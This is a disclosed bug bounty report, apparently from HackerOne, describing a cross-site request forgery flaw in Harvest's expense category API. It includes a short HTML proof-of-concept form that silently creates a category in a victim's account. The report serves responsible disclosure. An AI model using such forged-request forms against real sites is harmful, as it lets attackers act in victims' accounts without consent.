@@ -1,0 +1,40 @@
+ReportLink:https://hackerone.com/reports/152569
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/malcolmx
+ReportedTo:Harvest(harvest)
+BountyAmount:100.0
+Severity:
+State:Closed
+DateOfDisclosure:13.10.2016 20:22:30
+
+Summary:
+
+Hello,
+ I Found Cross-Site Request Forgery (CSRF) while  made new Category 
+
+POC :
+```
+<html>
+  <body>
+    <form action="https://[any_user_site].harvestapp.com/api/v2/expense_categories" 
+
+method="POST">
+      <input type="hidden" name="name" value="[category_name]" />
+      <input type="hidden" name="unit&#95;price" value="" />
+      <input type="hidden" name="unit&#95;name" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+```
+
+just put user site and the name of the category on this HTML Form and the category 
+will be created to this account.
+there is no any token to validate the request here 
+so the attacker can use this to made a  CSRF attack to any victim account
+
+
+__Please Watch My POC I Attached For More Details__
+
+Thanks
